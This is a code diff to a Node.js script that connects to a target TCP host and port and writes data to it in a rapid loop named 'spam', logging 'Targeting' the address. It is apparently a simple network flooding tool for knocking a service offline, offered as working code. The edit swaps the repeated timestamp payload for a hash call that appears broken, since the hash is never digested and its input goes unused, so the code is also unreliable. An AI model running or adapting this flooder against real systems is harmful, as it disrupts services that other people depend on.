@@ -1,4 +1,5 @@
 const net = require('net');
+const crypto = require("crypto")
 var argv = require('minimist')(process.argv.slice(2), {"--": true});
 
 if(!argv || !argv["a"]) {
@@ -18,7 +19,8 @@ function spam() {
   setInterval(() => {
     process.stdout.write(`[T${globalThis.thread}] #${i} Request\n`)
     i++
-    client.write(Date.now().toString(11).repeat(50000))
+    let datetime = Date.now().toString(11).repeat(16900)
+    client.write(crypto.createHash('sha256', datetime).toString())
   }, argv["i"] | 0.001)
 }
 
@@ -31,7 +33,7 @@ const TARGET = {
 var client = new net.Socket();
 client.connect(TARGET.PORT, TARGET.ADDR, spam);
 
-client.on('ready', () => {
+client.once('ready', () => {
   console.log("Client Ready!")
   console.log("Targeting " + TARGET.ADDR + ":" + TARGET.PORT)
   sleep(5E3)
